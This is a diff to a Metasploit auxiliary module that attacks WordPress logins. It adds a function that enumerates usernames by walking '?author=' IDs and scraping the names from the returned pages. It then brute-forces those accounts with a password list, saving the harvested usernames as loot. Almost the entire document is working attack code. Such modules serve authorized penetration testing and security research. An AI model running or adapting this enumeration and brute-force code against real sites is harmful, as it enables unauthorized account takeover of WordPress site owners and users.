@@ -1,14 +1,9 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
 #   http://metasploit.com/
 ##
-
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -20,18 +15,19 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'           => 'Wordpress Brute Force and User Enumeration Utility',
-			'Version'        => '$Revision$',
-			'Description'    => 'Wordpress Authentication Brute Force and User Enumeration Utility',
-			'Author'         => [
-				'Alligator Security Team',
-				'Tiago Ferreira <tiago.ccna[at]gmail.com>'
-		],
+			'Name'          => 'Wordpress Brute Force and User Enumeration Utility',
+			'Description'   => 'Wordpress Authentication Brute Force and User Enumeration Utility',
+			'Author'        =>
+				[
+					'Alligator Security Team',
+					'Tiago Ferreira <tiago.ccna[at]gmail.com>',
+					'Zach Grace <zgrace[at]404labs.com>'
+				],
 			'References'     =>
 				[
 					['BID', '35581'],
 					['CVE', '2009-2335'],
-					['OSVDB', '55713'],
+					['OSVDB', '55713']
 				],
 			'License'        =>  MSF_LICENSE
 		)
@@ -39,8 +35,11 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				OptString.new('URI', [false, 'Define the path to the wp-login.php file', '/wp-login.php']),
-				OptBool.new('VALIDATE_USERS', [ true, "Enumerate usernames", true ]),
+				OptBool.new('VALIDATE_USERS', [ true, "Validate usernames", true ]),
 				OptBool.new('BRUTEFORCE', [ true, "Perform brute force authentication", true ]),
+				OptBool.new('ENUMERATE_USERNAMES', [ true, "Enumerate usernames", true ]),
+				OptString.new('RANGE_START', [false, 'First user id to enumerate', '1']),
+				OptString.new('RANGE_END', [false, 'Last user id to enumerate', '10'])
 		], self.class)
 
 	end
@@ -51,6 +50,11 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	def run_host(ip)
+		usernames = []
+		if datastore['ENUMERATE_USERNAMES']
+			usernames = enum_usernames
+		end
+
 		if datastore['VALIDATE_USERS']
 			@users_found = {}
 			vprint_status("#{target_url} - WordPress Enumeration - Running User Enumeration")
@@ -68,17 +72,29 @@ class Metasploit3 < Msf::Auxiliary
 			if datastore['VALIDATE_USERS']
 				if @users_found && @users_found.keys.size > 0
 					vprint_status("#{target_url} - WordPress Brute Force - Skipping all but #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
-				else
-					vprint_status("#{target_url} - WordPress Brute Force - No valid users found. Exiting.")
-					return
 				end
 			end
+
+			# Brute-force using files.
 			each_user_pass { |user, pass|
 				if datastore['VALIDATE_USERS']
 					next unless @users_found[user]
 				end
-					do_login(user, pass)
+
+				do_login(user, pass)
 			}
+
+			# Brute force previously found users
+			if not usernames.empty?
+				print_status("#{target_url} - Brute-forcing previously found accounts...")
+				passwords = load_password_vars(datastore['PASS_FILE'])
+				usernames.each do |user|
+					passwords.each do |pass|
+						do_login(user, pass)
+					end
+				end
+			end
+
 		end
 	end
 
@@ -180,5 +196,45 @@ class Metasploit3 < Msf::Auxiliary
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
 		rescue ::Timeout::Error, ::Errno::EPIPE
 		end
+	end
+
+	def enum_usernames
+		usernames = []
+		for i in datastore['RANGE_START']..datastore['RANGE_END']
+			uri = "#{datastore['URI'].gsub(/wp-login/, 'index')}?author=#{i}"
+			print_status "#{target_url} - Requesting #{uri}"
+			res = send_request_cgi({
+				'method' => 'GET',
+				'uri' => uri
+			})
+
+			if (res and res.code == 301)
+				uri = URI(res.headers['Location'])
+				uri = "#{uri.path}?#{uri.query}"
+				res = send_request_cgi({
+					'method' => 'GET',
+					'uri' => uri
+				})
+			end
+
+			if res.nil?
+				print_error("#{target_url} - Error getting response.")
+			elsif res.code == 200 and res.body =~ /href="http[s]*:\/\/.*\/\?*author.+title="([[:print:]]+)" /i
+				username = $1
+				print_good "#{target_url} - Found user '#{username}' with id #{i.to_s}"
+				usernames << username
+			elsif res.code == 404
+				print_status "#{target_url} - No user with id #{i.to_s} found"
+			else
+				print_error "#{target_url} - Unknown error. HTTP #{res.code.to_s}"
+			end
+		end
+
+		if not usernames.empty?
+			p = store_loot('wordpress.users', 'text/plain', rhost, usernames * "\n", "#{rhost}_wordpress_users.txt")
+			print_status("#{target_url} - Usernames stored in: #{p}")
+		end
+
+		return usernames
 	end
 end
